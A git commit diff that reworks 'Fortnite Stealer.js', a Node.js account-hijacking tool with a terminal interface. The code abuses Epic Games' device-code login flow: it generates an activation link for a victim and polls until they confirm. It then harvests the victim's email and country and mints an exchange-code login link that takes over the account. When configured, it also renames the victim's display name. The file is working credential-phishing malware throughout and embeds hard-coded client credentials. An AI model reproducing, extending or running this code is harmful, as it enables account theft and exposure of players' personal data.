5723502a80071ef866623306df60f44ea29d8e0b
XoidFN <162973879+Xoid-FNCS@users.noreply.github.com>
2024-12-04 19:33:46 -0800

    Update Fortnite Stealer.js

--- Fortnite Stealer.js
+++ Fortnite Stealer.js
@@ -1,10 +1,9 @@
 import axios from 'axios';
-import readline from 'readline';
+import blessed from 'blessed';
+import fs from 'fs';
 import chalk from 'chalk';
 import { fileURLToPath } from 'url';
 import { dirname } from 'path';
-import fs from 'fs'; 
-import { readFileSync } from 'fs';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = dirname(__filename);
@@ -13,159 +12,174 @@ const TOKEN_URL = "https://account-public-service-prod.ol.epicgames.com/account/
 const DEVICE_AUTH_URL = "https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/deviceAuthorization";
 const CLIENT_CREDENTIALS = "Basic OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3";
 
-// Reading config.json to get the autoChangeName and newName
-const config = JSON.parse(readFileSync('./config.json', 'utf-8'));
+const config = JSON.parse(fs.readFileSync('./config.json', 'utf-8'));
 
-const rl = readline.createInterface({
-    input: process.stdin,
-    output: process.stdout
+const screen = blessed.screen({
+  smartCSR: true,
+  title: 'Fortnite Tool'
 });
 
-const displayHeader = () => {
-    console.log(chalk.magenta(
-        '  ______         _         _ _          _____ _             _           \n' +
-        ' |  ____|       | |       (_) |        / ____| |           | |          \n' +
-        ' | |__ ___  _ __| |_ _ __  _| |_ ___  | (___ | |_ ___  __ _| | ___ _ __ \n' +
-        ' |  __/ _ \\| \'_  | __| \'_ \\| | __/ _ \\  \\___ \\| __/ _ \\/ _ | |/ _ \\ \'__|\n' +
-        ' | | | (_) | |  | |_| | | | | ||  __/  ____) | ||  __/ (_| | |  __/ |   \n' +
-        ' |_|  \\___/|_|   \\__|_| |_|_|\\__\\___| |_____/ \\__\\___|\\__,_|_|\\___|_|   \n' +
-        '                                                                     '
-    ));
-};
-
-async function generateLinkAndPoll() {
-    try {
-        const tokenResponse = await axios.post(TOKEN_URL, "grant_type=client_credentials", {
-            headers: {
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Authorization": CLIENT_CREDENTIALS
-            }
-        });
-
-        const accessToken = tokenResponse.data.access_token;
-
-        const deviceAuthResponse = await axios.post(DEVICE_AUTH_URL, "prompt=login", {
-            headers: {
-                "Authorization": `Bearer ${accessToken}`,
-                "Content-Type": "application/x-www-form-urlencoded"
-            }
-        });
-
-        const deviceCode = deviceAuthResponse.data.device_code;
-        const userCode = deviceAuthResponse.data.user_code;
-        const verificationUrl = `https://www.epicgames.com/id/activate?userCode=${userCode}`;
-
-        console.log(chalk.blue(`Link: ${verificationUrl}`));
-
-        const startTime = Date.now();
-        let authorizationReceived = false;
-
-        let exchangeCode = null;
-
-        let loginLink = null;
-
-        while (!authorizationReceived && (Date.now() - startTime < 2 * 60 * 1000)) {
-            try {
-                const tokenExchangeResponse = await axios.post(TOKEN_URL, `grant_type=device_code&device_code=${deviceCode}&token_type=eg1`, {
-                    headers: {
-                        "Content-Type": "application/x-www-form-urlencoded",
-                        "Authorization": CLIENT_CREDENTIALS
-                    }
-                });
-
-                if (tokenExchangeResponse.status === 200) {
-                    const loggedInData = tokenExchangeResponse.data;
-
-                    if (loggedInData.access_token) {
-                        const userInfoResponse = await axios.get(`https://account-public-service-prod.ol.epicgames.com/account/api/public/account/${loggedInData.account_id}`, {
-                            headers: { "Authorization": `Bearer ${loggedInData.access_token}` }
-                        });
-
-                        const userInfo = userInfoResponse.data;
-                        exchangeCode = loggedInData.exchangeCode;
-
-                        const exchangeResponse = await axios.get(`https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange`, {
-                            headers: {
-                                "Authorization": `Bearer ${loggedInData.access_token}`
-                            }
-                        });
-
-                        const code = exchangeResponse.data.code;
-                        loginLink = `https://www.epicgames.com/id/exchange?exchangeCode=${code}`;
-
-                        console.log(formatUserInfo(userInfo, exchangeCode));
-                        console.log(chalk.bgCyan(`${loginLink}`));
-
-                        const fileName = `${userInfo.displayName}.json`;
-                        const filePath = `${__dirname}/${fileName}`;
-                        const data = {
-                            displayName: userInfo.displayName,
-                            loginLink: loginLink
-                        };
-
-                        fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf-8');
-                        console.log(chalk.green(`Login link saved to ${fileName}`));
-
-                        authorizationReceived = true;
-
-
-                        if (config.autoChangeName) {
-                            const randomSuffix = Math.floor(1000 + Math.random() * 9000);
-                            const newDisplayName = `${config.newName}${randomSuffix}`;
-
-                            try {
-                                const changeNameResponse = await axios.put(`https://account-public-service-prod.ol.epicgames.com/account/api/public/account/${loggedInData.account_id}`, 
-                                    { displayName: newDisplayName }, 
-                                    { headers: { "Authorization": `Bearer ${loggedInData.access_token}` } });
-
-                                if (changeNameResponse.status === 200) {
-                                    console.log(chalk.green(`Display name changed to: ${newDisplayName}`));
-                                } else {
-                                    console.log(chalk.red(`Failed to change display name`));
-                                }
-                            } catch (error) {
-                                console.error(chalk.red(`Error changing display name: ${error.message}`));
-                            }
-                        }
-
-                    }
-                }
-            } catch (error) {
-                if (error.response && error.response.status !== 400) {
-                    console.error(chalk.red(`Polling error: ${error.message}`));
-                }
-            }
-
-            await new Promise(resolve => setTimeout(resolve, 2000));
-        }
-
-        if (!authorizationReceived) {
-            console.log(chalk.yellow("Authorization timeout"));
-        }
-
-        await generateLinkAndPoll();
-    } catch (error) {
-        console.error(chalk.red(`Error: ${error.message}`));
+const logBox = blessed.log({
+  top: '0',
+  left: '0',
+  width: '100%',
+  height: '95%',
+  border: {
+    type: 'line'
+  },
+  style: {
+    fg: 'blue',
+    border: {
+      fg: 'blue'
     }
-}
+  },
+  scrollable: true,
+  alwaysScroll: true,
+  keys: true,
+  vi: true
+});
 
-const formatUserInfo = (userInfo, exchangeCode) => {
-    return chalk.cyan(`
-    Display Name: ${userInfo.displayName}
-    Email: ${userInfo.email}
-    Country: ${userInfo.country}
-    Full Name: ${userInfo.name} ${userInfo.lastName}
-    Preferred Language: ${userInfo.preferredLanguage}
-    2FA Enabled: ${userInfo.tfaEnabled ? 'Yes' : 'No'}
-    Email Verified: ${userInfo.emailVerified ? 'Yes' : 'No'}
-    Display Name Changes: ${userInfo.numberOfDisplayNameChanges}
-    Can Update Display Name: ${userInfo.canUpdateDisplayName ? 'Yes' : 'No'}
-    `);
+const inputBox = blessed.textbox({
+  bottom: 0,
+  left: 0,
+  width: '100%',
+  height: '5%',
+  inputOnFocus: true,
+  border: {
+    type: 'line'
+  },
+  style: {
+    fg: 'black',
+    border: {
+      fg: 'blue'
+    }
+  }
+});
+
+screen.append(logBox);
+screen.append(inputBox);
+
+const displayLog = (text) => {
+  logBox.log(text);
+  screen.render();
 };
 
-async function start() {
-    displayHeader();
+const waitForAuthorization = async (deviceCode, startTime, accessToken) => {
+  displayLog(chalk.yellow('│Waiting for confirm button to be pressed...'));
+
+  let authorizationReceived = false;
+  while (!authorizationReceived && (Date.now() - startTime < 2 * 60 * 1000)) {
+    try {
+      const tokenExchangeResponse = await axios.post(TOKEN_URL, `grant_type=device_code&device_code=${deviceCode}&token_type=eg1`, {
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Authorization": CLIENT_CREDENTIALS
+        }
+      });
+
+      if (tokenExchangeResponse.status === 200) {
+        const loggedInData = tokenExchangeResponse.data;
+
+        if (loggedInData.access_token) {
+          const userInfoResponse = await axios.get(`https://account-public-service-prod.ol.epicgames.com/account/api/public/account/${loggedInData.account_id}`, {
+            headers: { "Authorization": `Bearer ${loggedInData.access_token}` }
+          });
+
+          const userInfo = userInfoResponse.data;
+
+          const exchangeResponse = await axios.get(`https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange`, {
+            headers: {
+              "Authorization": `Bearer ${loggedInData.access_token}`
+            }
+          });
+
+          const code = exchangeResponse.data.code;
+          const loginLink = `https://www.epicgames.com/id/exchange?exchangeCode=${code}`;
+
+          displayLog(chalk.cyan(`
+          Display Name: ${userInfo.displayName}
+          Email: ${userInfo.email}
+          Country: ${userInfo.country}
+          Login Link: ${loginLink}
+          `));
+
+          if (config.autoChangeName) {
+            const randomSuffix = Math.floor(1000 + Math.random() * 9000);
+            const newDisplayName = `${config.newName}${randomSuffix}`;
+
+            try {
+              const changeNameResponse = await axios.put(`https://account-public-service-prod.ol.epicgames.com/account/api/public/account/${loggedInData.account_id}`,
+                { displayName: newDisplayName },
+                { headers: { "Authorization": `Bearer ${loggedInData.access_token}` } });
+
+              if (changeNameResponse.status === 200) {
+                displayLog(chalk.green(`Display name changed to: ${newDisplayName}`));
+              } else {
+                displayLog(chalk.red(`Failed to change display name.`));
+              }
+            } catch (error) {
+              displayLog(chalk.red(`Error changing display name: ${error.message}`));
+            }
+          }
+
+          authorizationReceived = true;
+        }
+      }
+    } catch (error) {
+      if (error.response && error.response.status !== 400) {
+        displayLog(chalk.red(`Polling error: ${error.message}`));
+      }
+    }
+
+    await new Promise(resolve => setTimeout(resolve, 2000));
+  }
+
+  if (!authorizationReceived) {
+    displayLog(chalk.yellow("Authorization timeout"));
+  }
+};
+
+const generateLinkAndPoll = async () => {
+  try {
+    const tokenResponse = await axios.post(TOKEN_URL, "grant_type=client_credentials", {
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Authorization": CLIENT_CREDENTIALS
+      }
+    });
+
+    const accessToken = tokenResponse.data.access_token;
+
+    const deviceAuthResponse = await axios.post(DEVICE_AUTH_URL, "prompt=login", {
+      headers: {
+        "Authorization": `Bearer ${accessToken}`,
+        "Content-Type": "application/x-www-form-urlencoded"
+      }
+    });
+
+    const deviceCode = deviceAuthResponse.data.device_code;
+    const verificationUrl = `https://www.epicgames.com/id/activate?userCode=${deviceAuthResponse.data.user_code}`;
+
+    displayLog(chalk.blue(`Link: ${verificationUrl}`));
+
+    const startTime = Date.now();
+    await waitForAuthorization(deviceCode, startTime, accessToken);
+
     await generateLinkAndPoll();
-}
+  } catch (error) {
+    displayLog(chalk.red(`Error: ${error.message}`));
+  }
+};
+
+const start = async () => {
+  screen.render();
+
+  inputBox.on('submit', () => {
+    logBox.setContent('');
+    screen.render();
+  });
+
+  await generateLinkAndPoll();
+};
 
 start();
